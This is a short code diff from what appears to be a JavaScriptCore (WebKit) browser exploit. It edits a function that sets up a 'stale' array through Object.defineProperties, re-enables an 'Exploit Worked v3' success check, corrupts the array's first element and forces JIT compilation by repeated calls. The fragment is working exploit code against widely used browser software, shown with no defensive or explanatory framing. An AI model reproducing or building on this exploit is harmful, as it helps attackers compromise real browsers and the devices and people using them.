@@ -164,14 +164,13 @@ function go_() {
 	Object.defineProperties(target, props);
 	stale = target.stale;
 
-	/*	 
 	if(before_len != stale.length){
-		//alert("Exploit Worked v3");
+		alert("Exploit Worked v3");
 	} else {
 		alert("Exploit Failed");
 		document.location.reload();
 	}
-	*/
+	
 	stale[0] += 0x101;
 
 	// Call the function 0x1000 times to force JavascriptCore to mark it as high-usage and JIT it.
